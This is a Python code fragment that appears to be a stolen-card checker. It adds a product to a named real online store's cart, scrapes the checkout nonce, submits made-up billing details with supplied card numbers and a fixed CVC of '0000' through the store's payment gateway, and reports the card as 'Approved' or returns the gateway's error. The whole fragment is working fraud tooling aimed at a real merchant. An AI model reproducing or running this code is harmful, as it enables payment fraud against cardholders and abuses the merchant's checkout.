    ...
    for _ in range(3):
        try:
            ...
            hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Origin': 'https://www.stencilsonline.com',
                    'Referer': 'https://www.stencilsonline.com/acrylic-paints/alizarin-crimson-acrylic-paint/'}
            sess.post('https://www.stencilsonline.com/acrylic-paints/alizarin-crimson-acrylic-paint/',
                      headers={**hdrs, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                      data={'quantity': '1', 'add-to-cart': '253'}, timeout=20)
            ...
            if not nonce:
                last = 'nonce not found'; continue

            data = (f'billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_country=US'
                    f'&billing_address_1={st}&billing_address_2=&billing_city=NY&billing_state=NY'
                    f'&billing_postcode=10080&billing_phone={ph}&billing_email={quote(em)}'
                    f'&shipping_method%5B0%5D=flat_rate%3A9&payment_method=usaepay'
                    f'&usaepay-card-number={num}&usaepay-card-expiry={mes}%2F{ano}'
                    f'&usaepay-card-cvc=0000'
                    f'&woocommerce-process-checkout-nonce={nonce}'
                    f'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review')
            r3 = sess.post('https://www.stencilsonline.com/?wc-ajax=checkout',
                           headers={**hdrs, 'Accept': 'application/json, text/javascript, */*; q=0.01',
                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                           data=data, timeout=20)
            rj  = r3.json()
            if rj.get('result') == 'success':
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Order Successful'}
            msg = (_found(r3.text, 'Gateway Error: <!-- Error: ', '"')
                   or _found(r3.text, '<li>', '</li>')
                   or rj.get('messages', '') or str(rj.get('result', r3.text[:100])))
